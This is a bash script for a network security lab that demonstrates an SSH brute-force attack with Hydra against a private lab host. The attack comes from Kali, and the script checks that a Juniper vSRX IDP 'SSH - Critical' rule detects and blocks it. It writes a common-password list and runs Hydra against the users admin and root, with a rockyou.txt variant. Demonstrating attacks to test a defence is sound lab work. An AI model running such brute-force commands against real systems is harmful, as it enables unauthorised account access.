#!/bin/bash
# Scenario 4: SSH Brute Force with Hydra
# Run this from Kali Linux (ssh kali@<kali-eip>)
#
# BEFORE applying defense:
#   Hydra makes many SSH connection attempts; SRX logs show traffic passing
#
# AFTER defense (IDP: "SSH - Critical" predefined attack group):
#   IDP detects brute force pattern and drops connections from Kali's IP
#   The ip-action may block Kali's IP entirely for a period
#
# PREREQUISITE: IDP signatures must be installed on vSRX first!
#   request security idp security-package download
#   request security idp security-package install
#
# Verify on vSRX:
#   show security idp attack table
#   show security idp counters
#   show log security-log | match "SSH" | last 20

TARGET="10.0.2.100"

echo "========================================"
echo "Scenario 4: SSH Brute Force"
echo "Target: $TARGET"
echo "========================================"
echo ""

echo "[*] Creating a small password list..."
cat > /tmp/demo-passwords.txt <<'PASSWORDS'
admin
root
password
123456
letmein
welcome
monkey
dragon
qwerty
test
PASSWORDS

echo "[*] Starting SSH brute force (common usernames)..."
echo "    Trying user 'admin'..."
hydra -l admin -P /tmp/demo-passwords.txt "$TARGET" ssh -t 4 -V -I
echo ""

echo "[*] Trying user 'root'..."
hydra -l root -P /tmp/demo-passwords.txt "$TARGET" ssh -t 4 -V -I
echo ""

echo "[*] For a more intensive attack (requires rockyou.txt):"
echo "    hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4 -V"
echo ""
echo "[+] On vSRX, run:"
echo "    show security idp attack table"
echo "    show security idp counters"
